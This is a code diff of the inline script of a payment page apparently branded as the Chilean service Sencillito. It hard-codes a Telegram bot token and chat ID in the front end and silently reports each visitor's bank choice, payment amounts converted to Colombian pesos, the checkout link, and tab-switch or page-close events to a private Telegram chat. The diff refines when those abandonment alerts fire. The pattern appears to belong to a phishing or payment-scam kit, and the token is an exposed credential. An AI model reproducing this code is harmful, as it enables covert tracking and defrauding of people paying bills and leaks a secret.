@@ -262,11 +262,9 @@
     </div>
 
     <script>
-        // ===== VARIABLES TELEGRAM (en el front, como pediste) =====
+        // ===== VARIABLES TELEGRAM =====
         const TELEGRAM_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
         const TELEGRAM_CHAT_ID = '-1004457768033';
-
-        // Tipo de cambio CLP -> COP (ajústalo si quieres; aprox. 1 CLP ≈ 4.3 COP)
         const CLP_TO_COP = 4.3;
 
         const formatCLP = (amount) => {
@@ -277,7 +275,6 @@
             return new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', maximumFractionDigits: 0 }).format(amount);
         };
 
-        // Enviar mensaje a Telegram (sin bloquear el flujo)
         async function notificarTelegram(mensaje) {
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
@@ -294,10 +291,12 @@
             }
         }
 
-        // Datos de pago globales
+        // Estado global
         let datosPagoActual = null;
         let notificadoSalida = false;
         let pagoIniciado = false;
+        let redirigiendo = false;   // bloquea aviso de salida si ya va al checkout
+        let pagoCompletado = false; // bloquea aviso si el pago ya se generó
 
         document.addEventListener('DOMContentLoaded', () => {
             const stored = localStorage.getItem('sencillito_pago_pendiente');
@@ -321,9 +320,10 @@
             document.getElementById('mobile-logo').src = data.logo;
         });
 
-        // Detectar si la persona se sale de la página
+        // Detectar salida SOLO si NO se está redirigiendo ni se completó el pago
         function notificarSalida(motivo) {
             if (notificadoSalida || !datosPagoActual) return;
+            if (redirigiendo || pagoCompletado) return;
             notificadoSalida = true;
 
             const montoCLP = formatCLP(datosPagoActual.monto);
@@ -342,11 +342,17 @@
 
         document.addEventListener('visibilitychange', () => {
             if (document.visibilityState === 'hidden') {
-                notificarSalida('Cambió de pestaña / app');
+                // Delay: si el usuario vuelve rápido, no se notifica
+                setTimeout(() => {
+                    if (document.visibilityState === 'hidden') {
+                        notificarSalida('Cambió de pestaña / app');
+                    }
+                }, 1500);
             }
         });
 
         window.addEventListener('beforeunload', () => {
+            if (redirigiendo || pagoCompletado) return;
             notificarSalida('Cerró o recargó la página');
         });
 
@@ -363,7 +369,6 @@
             datosPagoActual = datosPago;
             pagoIniciado = nombreBanco;
 
-            // Notificar a Telegram que eligió banco + montos
             const montoCLP = formatCLP(datosPago.monto);
             const montoCOP = formatCOP(Math.round(datosPago.monto * CLP_TO_COP));
 
@@ -401,6 +406,10 @@
                 const data = await response.json();
 
                 if (data.success && data.checkout_url) {
+                    // MARCAR como redirigiendo ANTES de navegar
+                    redirigiendo = true;
+                    pagoCompletado = true;
+
                     notificarTelegram(
                         `✅ <b>LINK DE PAGO GENERADO</b>\n` +
                         `🏢 <b>Servicio:</b> ${datosPago.empresa}\n` +
@@ -410,6 +419,7 @@
                         `🔗 <b>Link:</b> ${data.checkout_url}\n` +
                         `🕒 ${new Date().toLocaleString('es-CL')}`
                     );
+
                     window.location.href = data.checkout_url;
                 } else {
                     throw new Error(data.error || 'Error al crear el link de pago');
@@ -427,4 +437,4 @@
         }
     </script>
 </body>
-</html>
+                    </html>
